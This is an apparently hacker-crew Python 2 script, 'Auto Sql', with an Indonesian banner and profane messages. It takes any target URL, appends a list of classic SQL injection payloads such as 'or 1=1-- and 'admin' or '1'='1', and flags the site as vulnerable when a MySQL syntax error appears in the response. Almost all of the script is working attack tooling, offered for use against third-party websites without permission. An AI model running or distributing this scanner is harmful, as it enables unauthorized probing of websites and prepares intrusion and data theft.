import sys
import urllib
import os
import time

os.system("clear")
os.system("figlet Auto Sql")
time.sleep(1)
print "Tools Auto Cek Vuln MySql"
time.sleep(0.1)
print "No Recod Ya Asu"
time.sleep(1)
print "---------------------------------"
time.sleep(0.1)
print "Coder : Tuman"
time.sleep(0.1)
print "Team : 22XploiterCrew"
time.sleep(0.1)
print "Thanks To All Member 22Xc & N.P.T"
time.sleep(0.1)
print "---------------------------------"
time.sleep(1)
print
time.sleep(0.1)
print "Contoh : https://www.xnxx.com/bokep.php?id=15"
time.sleep(0.1)
print "Harus Full Url Ya Asu"
time.sleep(1)
print
fullurl = raw_input("Url: ")
errormsg = "You have an error in your SQL syntax"
payloads = ["'admin'or 1=1 or ''='", "'=1\' or \'1\' = \'1\'", "'or 1=1", "'1 'or' 1 '=' 1", "'or 1=1#", "'0 'or' 0 '=' 0", "'admin'or 1=1 or ''='", "'admin' or 1=1", "'admin' or '1'='1", "'or 1=1/*", "'or 1=1--"] #whatever payloads you want here ## YOU CAN ADD YOUR OWN
errorr = "yes"
for payload in payloads:
    try:
        payload = payload
        resp = urllib.urlopen(fullurl + payload)
        body = resp.read()
        fullbody = body.decode('utf-8')
    except:
        print "[-] Error! Manually check this payload: " + payload
        errorr = "no"
        #sys.exit()
    if errormsg in fullbody:
        if errorr == "no":
            print "[-] That payload might not work!"
            errorr = "yes"
        else:
            print "[+] Website Nya Vuln Anjeng! Payload: " + payload
    else:
        print "[-] Website Gak Vuln Kontol!"